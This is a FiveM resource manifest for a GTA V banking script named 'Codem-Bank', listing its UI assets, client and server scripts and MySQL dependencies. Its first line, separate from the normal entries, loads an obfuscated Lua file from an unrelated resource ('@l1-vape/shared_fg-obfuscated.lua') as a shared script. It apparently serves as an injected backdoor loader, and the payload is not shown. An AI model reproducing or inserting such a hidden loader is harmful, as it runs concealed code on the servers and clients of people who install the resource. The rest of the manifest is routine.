shared_script '@l1-vape/shared_fg-obfuscated.lua'
fx_version 'cerulean'
game 'gta5'
author 'Aiakos#8317'
description 'Codem-Bank'
version '1.8.1'
ui_page {
	'html/index.html',
}
files {
	'html/css/*.css',
	'html/app/*.js',
	'html/lib/*.js',
	'html/lib/*.css',
	'html/*.html',
	'html/images/*.png',
	'html/fonts/*.otf',
	'html/fonts/*.OTF',
	'html/fonts/*.TTF',
	'html/fonts/*.ttf',
	'html/sound/*.mp3',
    'html/sound/*.ogg',
}
shared_script{
	'config/config.lua',
	'GetFrameworkObject.lua',
}
escrow_ignore {
	'config/config.lua',
	'GetFrameworkObject.lua',
	'server/editable.lua',
	'server/discordlog.lua',
	'server/society.lua',
	'config/server_config.lua',
	'client/editable.lua',
}
client_scripts {
	'GetFrameworkObject.lua',
	'client/main.lua',
	'client/editable.lua',
}
server_scripts {
	-- '@mysql-async/lib/MySQL.lua', --⚠️PLEASE READ⚠️; Uncomment this line if you use 'mysql-async'.⚠️
    '@oxmysql/lib/MySQL.lua', --⚠️PLEASE READ⚠️; Uncomment this line if you use 'oxmysql'.⚠️
	'config/server_config.lua',
	'server/main.lua',
	'server/society.lua',
	'server/editable.lua',
	'server/discordlog.lua',
	'GetFrameworkObject.lua',
}
lua54 'yes'
dependency '/assetpacks'